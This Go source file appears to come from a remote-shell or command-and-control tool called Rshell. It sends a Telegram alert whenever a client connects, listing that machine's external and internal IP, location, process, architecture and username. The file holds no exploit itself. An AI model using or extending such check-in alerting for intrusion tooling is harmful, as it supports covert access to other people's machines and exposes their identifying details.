package webhooks

import (
"Rshell/pkg/database"
"Rshell/pkg/logger"
"bytes"
"encoding/json"
"fmt"
"net/http"
"time"
)

func SendTelegram(Client database.Clients, token string, chatID string) error {
	content := fmt.Sprintf("🤖 Rshell 客户端上线通知\n\n🌍 External IP: %s\n📍 Location: %s\n⚙️ Process: %s\n💻 Arch: %s\n🔌 Internal IP: %s\n👤 User: %s",
Client.ExternalIP, Client.Address, Client.Process, Client.Arch, Client.InternalIP, Client.Username)

	webhookURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", token)
	payload := map[string]interface{}{
		"chat_id": chatID,
		"text":    content,
	}

	body, _ := json.Marshal(payload)
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(webhookURL, "application/json", bytes.NewBuffer(body))
	if err != nil {
		logger.Error("SendTelegram: " + err.Error())
		return err
	}
	defer resp.Body.Close()
	return nil
}
